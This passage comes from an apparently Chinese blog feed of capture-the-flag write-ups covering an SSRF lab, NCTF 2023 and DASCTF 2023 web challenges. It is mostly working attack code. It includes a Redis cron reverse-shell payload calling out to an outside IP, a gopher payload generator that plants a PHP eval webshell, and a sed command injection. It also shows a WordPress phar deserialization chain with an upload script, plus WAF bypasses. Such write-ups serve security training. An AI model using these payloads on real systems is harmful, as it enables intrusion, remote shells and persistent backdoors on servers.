class="line">dict://172.72.23.27:6379/set%20x%20<span class="string">&quot;\n*%20*%20*%20*%20*%20/bin/bash%20-i%20&gt;%26%20/dev/tcp/43.143.167.75/8888%200&gt;%261\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#保存操作</span></span><br><span class="line">dict://172.72.23.27:6379/save</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>依次执行完后，就会发现反弹shell成功：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201659355-311539757.png" alt="image-20240615201657845"></p><h1>172.72.23.28-redis有授权</h1><p>在172.72.23.28上6379有redis服务，不过有密码验证，无法直接未授权执行命令：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201707631-640023465.png" alt="image-20240615201706127"></p><p>在172.72.23.28上不仅在6379有redis服务，同样存在80端口存在web服务：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201715368-1428928021.png" alt="image-20240615201713849"></p><p>这是一个LFI 本地文件包含，可以利用此来读取本地的文件内容：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201721471-1218075983.png" alt="image-20240615201720034"></p><p>因为 Redis 密码记录在 redis.conf 配置文件中，结合这个文件包含漏洞点，那么这时来尝试借助目标机器的文件包含漏洞来读取 redis 的配置文件信息，Redis 常见的配置文件路径如下：</p><blockquote><p>/etc/redis.conf</p><p>/etc/redis/redis.conf</p><p>/usr/local/redis/etc/redis.conf</p><p>/opt/redis/ect/redis.conf</p></blockquote><p>经测试发现，<code>/etc/redis.conf</code>存在我们想要的东西</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201729516-1512320338.png" alt="image-20240615201727983"></p><p>先明确一下攻击思路，和前面的弹shell差不多，区别在于这里使用gopher协议，如果条件允许的话也是可以用dict协议来写shell的。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 认证 redis</span></span><br><span class="line">auth P@ssw0rd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空 key</span></span><br><span class="line">flushall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置要操作的路径为网站根目录</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在网站目录下创建 shell.php 文件</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 shell.php 的内容</span></span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\n&lt;?php eval(<span class="variable">$_GET</span>[1]);?&gt;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存上述操作</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>使用自动化工具：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201741929-1665218802.png" alt="image-20240615201740184"></p><p>复制生成的payload到bp解码，删除<code>gopher://127.0.0.1:6379/_</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201749511-1740341725.png" alt="image-20240615201747872"></p><p>加上如下内容：</p><blockquote><p>*2<br>$1<br>auth<br>$8<br>P@ssw0rd</p></blockquote><p>这是Redis数据包的传输方式，*2代表此次传输两条指令，$1代表指令长度为1：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201756918-1132048303.png" alt="image-20240615201755593"></p><p>最后将这个Redis的数据包url编码两次发送就行了</p><p>但是我不知道哪里有问题，没有成功，所以改用用脚本实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">protocol = <span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip = <span class="string">&quot;172.72.23.28&quot;</span></span><br><span class="line">port = <span class="string">&quot;6379&quot;</span></span><br><span class="line">shell = <span class="string">&quot;\n\n&lt;?php eval($_GET[1]);?&gt;\n\n&quot;</span></span><br><span class="line">filename = <span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path = <span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd = <span class="string">&quot;P@ssw0rd&quot;</span></span><br><span class="line">cmd = [<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">       <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">       <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">       <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">       <span class="string">&quot;save&quot;</span>,</span><br><span class="line">       <span class="string">&quot;quit&quot;</span></span><br><span class="line">       ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>, <span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload = protocol + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/_&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;*&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd += CRLF + <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd += CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line">    <span class="built_in">print</span>(urllib.parse.quote(payload))</span><br></pre></td></tr></table></figure><p>写入成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201808875-975668163.png" alt="image-20240615201807255"></p><p>rce成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240615201814062-1827052478.png" alt="image-20240615201812529"></p>]]></content>
    
    
    <summary type="html">国光ssrf Writeup</summary>
    
    
    
    <category term="Challenge" scheme="https://www.fomal.cc/categories/Challenge/"/>
    
    
    <category term="ssrf" scheme="https://www.fomal.cc/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>NCTF 2023</title>
    <link href="https://www.fomal.cc/posts/b4f8e239.html"/>
    <id>https://www.fomal.cc/posts/b4f8e239.html</id>
    <published>2023-12-24T11:24:52.000Z</published>
    <updated>2024-06-07T12:35:24.800Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>Web</h1><h2 id="Webshell-Generator">Webshell Generator</h2><p>题目是一个Webshell生成的功能，可以填写Webshell的语言（只有PHP）、访问方法、Webshell密码（通过前端限制格式为[A-Za-z0-9]）</p><p>生成完后会将其下载到本地</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190526171-82943956.png" alt="image-20240607190523741"></p><p>通过抓包发现可以任意下载文件，经测试发现无权限读取flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190535254-197244968.png" alt="image-20240607190533034"></p><p>尝试读取页面源码：<code>/download.php?file=index.php&amp;filename=webshell.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">security_validate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\r|\n/&#x27;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;<span class="subst">$key</span> 不能包含换行符！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>) &gt; <span class="number">114</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;<span class="subst">$key</span> 不能超过114个字符！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">security_validate</span>();</span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>] &amp;&amp; @<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>] &amp;&amp; @<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;language&#x27;</span>] !== <span class="string">&#x27;PHP&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;PHP是最好的语言&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$method</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>];</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;METHOD=<span class="subst">$method</span>&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;你的method太复杂了！&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;KEY=<span class="subst">$key</span>&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;你的key太复杂了！&quot;</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = -<span class="number">1</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;sh generate.sh&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;生成失败了！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: download.php?file=<span class="subst">$filename</span>&amp;filename=<span class="subst">&#123;$_POST[&#x27;filename&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现在代码中会调用<code>sh generate.sh</code>，可以得到相关代码：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/download.php?file=generate.sh&amp;filename=webshell.php</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line">NEW_FILENAME=$(<span class="built_in">tr</span> -dc a-z0-9 &lt;/dev/urandom | <span class="built_in">head</span> -c 16)</span><br><span class="line"><span class="built_in">cp</span> template.php <span class="string">&quot;/tmp/<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&quot;s/KEY/<span class="variable">$KEY</span>/g&quot;</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line">sed -i <span class="string">&quot;s/METHOD/<span class="variable">$METHOD</span>/g&quot;</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">realpath</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br></pre></td></tr></table></figure><p>发现在<code>generate.sh</code>中会使用<code>set -i</code>将环境变量<code>KEY</code>和<code>METHOD</code>替换为文件中的内容，而php代码中使用<code>putenv</code>设置环境变量，所以只要控制其中一个或两个值即可</p><p>exp：提交key为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/g;e/readflag;s<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">/g;：闭合前面的 s/</span><br><span class="line">e：执行命令</span><br><span class="line">/readflag;：提示中说运行这个即可获得flag</span><br><span class="line">s<span class="comment">//：闭合后面的/g</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190552762-2119695271.png" alt="image-20240607190550342"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190556639-134092447.png" alt="image-20240607190554348"></p><h2 id="Wait-What">Wait What?</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190606246-2132198011.png" alt="image-20240607190604100"></p><p>查看源码发现每个函数里都存在着<code>text()</code>的方法，尝试从这里出发</p><p>审计代码，查找资料，得知在g全局模式下，重复调用test进行匹配会出现真假交替的情况</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190614195-1972211957.png" alt="image-20240607190611970"></p><p>所以如果能触发两次test方法可以绕过黑名单</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190620126-874619407.png" alt="image-20240607190617928"></p><p>而更新正则对象的部分在<code>try_catch</code>中，所以如果报错就能阻止正则对象的更新，因为对象不能像数组那样遍历取值，所以用对象来报错</p><p><code>/api/ban_user</code>接口传入<code>&#123;&quot;username&quot;:&quot;user&quot;,&quot;password&quot;:&quot;user&quot;,&quot;ban_username&quot;:&#123;&quot;a&quot;:&quot;b&quot;&#125;&#125;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190630964-1814062245.png" alt="image-20240607190628711"></p><p>发现利用报错成功阻止了正则对象的更新，接下来只需要利用admin的身份请求两次flag即可，第一次请求为了将<code>ban_user</code>名单替换成我们更新的<code>user</code>第二次则可以成功请求到flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190639137-1948604582.png" alt="image-20240607190636955"></p><h2 id="ez-wordpress">ez_wordpress</h2><p>先看提示：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190653522-233680141.png" alt="image-20240607190651035"></p><p>信息搜集直接用wpscan扫一下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://124.71.184.68:8012/ -e --api-token xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>根据提示，看下6.4.1版本的数据：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190703799-1163223648.png" alt="image-20240607190701298"></p><p>是一个关于POP链的漏洞<a href="https://fenrisk.com/publications/blogpost/2023/11/22/gadgets-chain-in-wordpress/">第三方链接</a></p><p>看文章后可以通过<code>call_user_func</code>，来找到反序列化链子</p><p>发现有<code>all-in-one-video-gallery</code>插件的漏洞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190714231-1846360800.png" alt="image-20240607190711659"></p><p>该插件存在任意文件读取的cve，操控dl参数实现</p><p>再找到drag-and-drop-multiple-file-upload-contact-form-7的上传，参考<a href="https://www.exploit-db.com/exploits/48520">Drag and Drop File Upload</a></p><p>根据提示以及结合上面的内容，可以知道利用任意文件上传+ssrf任意文件读取触发phar反序列化</p><p>通过phpggc生成phar文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc WordPress/RCE2 system <span class="string">&quot;echo PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7|base64 -d &gt; a.php&quot;</span> -p phar -o a.png</span><br></pre></td></tr></table></figure><p>然后上传文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://124.71.184.68:8012//wp-admin/admin-ajax.php&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;supported_type&quot;</span>:<span class="string">&quot;png&quot;</span>,</span><br><span class="line">    <span class="string">&quot;size_limit&quot;</span>:<span class="string">&quot;5242880&quot;</span>,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>:<span class="string">&quot;dnd_codedropz_upload&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>:<span class="string">&quot;click&quot;</span>,</span><br><span class="line">    <span class="string">&quot;security&quot;</span>:<span class="string">&quot;b738e27dac&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data=data,files=&#123;<span class="string">&#x27;upload-file&#x27;</span>:(<span class="string">&#x27;logo.png&#x27;</span>,<span class="built_in">open</span>(<span class="string">&#x27;./a.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>))&#125;</span><br><span class="line">                 )</span><br><span class="line"><span class="built_in">print</span>(r.content)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190732772-826009879.png" alt="image-20240607190730380">然后触发phar</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.71.184.68:8012/index.php/video/?dl=cGhhcjovLy92YXIvd3d3L2h0bWwvd3AtY29udGVudC91cGxvYWRzL3dwX2RuZGNmN191cGxvYWRzL3dwY2Y3LWZpbGVzL2xvZ28ucG5nL3Rlc3QudHh0</span><br></pre></td></tr></table></figure><p>拿蚁剑连接</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190741554-1085633327.png" alt="image-20240607190739159"></p><p>连接成功，但是flag没有读取权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190752853-2055503162.png" alt="image-20240607190750707"></p><p>用date命令就拿到flag了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">date</span> -f /flag</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190759425-1847162763.png" alt="image-20240607190757156"></p>]]></content>
    
    
    <summary type="html">NCTF 2023 Writeup</summary>
    
    
    
    <category term="Writeup" scheme="https://www.fomal.cc/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.fomal.cc/tags/CTF/"/>
    
    <category term="Competition" scheme="https://www.fomal.cc/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF X 0psu3十一月挑战赛 2023</title>
    <link href="https://www.fomal.cc/posts/1ea185c6.html"/>
    <id>https://www.fomal.cc/posts/1ea185c6.html</id>
    <published>2023-11-28T07:46:06.000Z</published>
    <updated>2024-06-06T11:41:05.615Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>Web</h1><h2 id="realrce">realrce</h2><p>附件中有源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">input_code</span>) &#123;</span><br><span class="line">    bypasspin = <span class="regexp">/%[0-9a-fA-F]&#123;2&#125;/i</span>;</span><br><span class="line">    <span class="keyword">const</span> bypasscode = bypasspin.<span class="title function_">test</span>(input_code);</span><br><span class="line">    <span class="keyword">if</span> (bypasscode) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">waf</span>(<span class="built_in">decodeURIComponent</span>(input_code));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error decoding input: &quot;</span>, error);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> blacklist = [<span class="regexp">/__proto__/i</span>, <span class="regexp">/constructor/i</span>, <span class="regexp">/prototype/i</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> blackword <span class="keyword">of</span> blacklist) &#123;</span><br><span class="line">        <span class="keyword">if</span> (blackword.<span class="title function_">test</span>(input_code)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用报错来绕过waf进行原型链污染</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LockCylinder</span>(<span class="params">input, blackchr = [<span class="string">&quot;&amp;&amp;&quot;</span>, <span class="string">&quot;||&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;;&quot;</span>]</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">resultArray</span> = [];</span><br><span class="line">    let currentPart = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; input.length; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">currentChar</span> = input[i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (blackchr.<span class="title function_ invoke__">includes</span>(currentChar)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (currentPart.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                resultArray.<span class="title function_ invoke__">push</span>(currentPart);</span><br><span class="line">                currentPart = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            currentPart += currentChar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (currentPart.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        resultArray.<span class="title function_ invoke__">push</span>(currentPart);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resultArray;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_cmd</span>(<span class="params">cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">command</span> = [<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;&lt;&gt;&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;if&quot;</span>, <span class="string">&quot;then&quot;</span>, <span class="string">&quot;else&quot;</span>, <span class="string">&quot;elif&quot;</span>, <span class="string">&quot;fi&quot;</span>, <span class="string">&quot;case&quot;</span>, <span class="string">&quot;esac&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;while&quot;</span>, <span class="string">&quot;until&quot;</span>, <span class="string">&quot;do&quot;</span>, <span class="string">&quot;done&quot;</span>, <span class="string">&quot;in&quot;</span>, <span class="string">&quot;function&quot;</span>, <span class="string">&quot;time&quot;</span>, <span class="string">&quot;coproc&quot;</span>, <span class="string">&quot;alias&quot;</span>, <span class="string">&quot;bg&quot;</span>, <span class="string">&quot;bind&quot;</span>, <span class="string">&quot;break&quot;</span>, <span class="string">&quot;builtin&quot;</span>, <span class="string">&quot;caller&quot;</span>, <span class="string">&quot;cd&quot;</span>, <span class="string">&quot;command&quot;</span>, <span class="string">&quot;compgen&quot;</span>, <span class="string">&quot;complete&quot;</span>, <span class="string">&quot;compopt&quot;</span>, <span class="string">&quot;continue&quot;</span>, <span class="string">&quot;declare&quot;</span>, <span class="string">&quot;dirs&quot;</span>, <span class="string">&quot;disown&quot;</span>, <span class="string">&quot;echo&quot;</span>, <span class="string">&quot;enable&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;exit&quot;</span>, <span class="string">&quot;export&quot;</span>, <span class="string">&quot;false&quot;</span>, <span class="string">&quot;fc&quot;</span>, <span class="string">&quot;fg&quot;</span>, <span class="string">&quot;getopts&quot;</span>, <span class="string">&quot;hash&quot;</span>, <span 